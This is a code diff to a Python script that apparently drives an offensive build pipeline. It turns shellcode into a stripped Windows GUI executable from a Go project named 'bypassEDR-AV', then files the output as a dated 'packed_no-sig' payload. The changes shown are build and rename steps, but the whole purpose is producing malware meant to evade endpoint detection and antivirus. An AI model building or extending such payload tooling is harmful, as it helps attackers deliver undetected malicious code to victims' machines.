@@ -1,4 +1,5 @@
 import questionary
+import datetime
 import re
 import sys
 import subprocess
@@ -39,26 +40,29 @@ def process_shellcode_and_update_manifest(shellcode_file, manifest_path):
 
         # Update go.mod from version 1.23.0 to just 1.23
         result = subprocess.run('''sed -i 's/^go [0-9]\+\.[0-9]\+\(\.[0-9]\+\)*$/go 1.23/' /app/bypassEDR-AV/go.mod''', shell=True, cwd="/app/bypassEDR-AV", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
-        result = subprocess.run("cat /app/bypassEDR-AV/go.mod", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
-        print(result.stdout)
-
         # Update the RSC
         result = subprocess.run('''GOOS=windows GOARCH=amd64 /usr/bin/go build -ldflags="-H=windowsgui -s -w"''', shell=True, cwd="/app/bypassEDR-AV", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
         # Rename the Payload
-        print("\033[32m[+] Checking is payload has been created:\033[0m")
+        print("\033[32m[+] Checking if payload has been created:\033[0m")
         # Ensuring payload was created 
         result = subprocess.run("ls -lah /app/bypassEDR-AV/edr.exe", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
         print(result.stdout)
-
-        # Move the payload over 
+        # Move the payload to the mounted payloads directory
+# Generate the new filename with the current date
+        current_date = datetime.datetime.now().strftime("%Y-%m-%d")
+        new_filename = f"payload_{current_date}_packed_no-sig_x64.exe"
+        try:
+            move_command = f"mv /app/bypassEDR-AV/edr.exe /app/payloads/{new_filename}"
+            result = subprocess.run(move_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
+            print("\033[32m[+] Payload moved to /app/payloads/ successfully.\033[0m")
+            print(result.stdout)
+        except subprocess.CalledProcessError as e:
+            print("\033[31m[-] Failed to move payload to /app/payloads/. Error:\033[0m")
+            print(e.stderr)
 
     except Exception as e:
         print(f"Error: {e}")
         sys.exit(1)
-
-        # Compile Payload
-
-        # Move Payload Over to /app/payloads directory
 
 def exe():
     # Display Choices for Encryption Type
